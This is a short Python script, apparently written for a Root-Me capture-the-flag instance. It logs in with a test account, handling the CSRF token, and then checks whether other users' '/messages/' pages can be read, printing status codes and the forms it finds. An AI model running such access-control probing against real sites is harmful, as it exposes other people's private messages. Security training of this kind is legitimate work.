import requests, re
U="https://instance-019fe9e3-a6de-72c7-9cf7-76c651bf1127.challenges.root-me.pro"
s=requests.Session()
def tok(p):
    r=s.get(U+p); m=re.search(r'name="csrf_token"[^>]*value="([^"]+)"',r.text); return m.group(1) if m else None
s.post(U+"/login",data={"csrf_token":tok("/login"),"username":"pauk01","password":"Passw0rd!23","submit":"Sign In"})
for u in ["alicemartin","brunolefevre"]:
    r=s.get(U+"/messages/"+u,allow_redirects=False)
    print(u,r.status_code,r.headers.get("location"),len(r.text))
    if r.status_code==200:
        open("messages.html","w").write(r.text)
        for m in re.findall(r'<form[^>]*>|<input[^>]*>|<textarea[^>]*>',r.text): print("  ",m[:180])
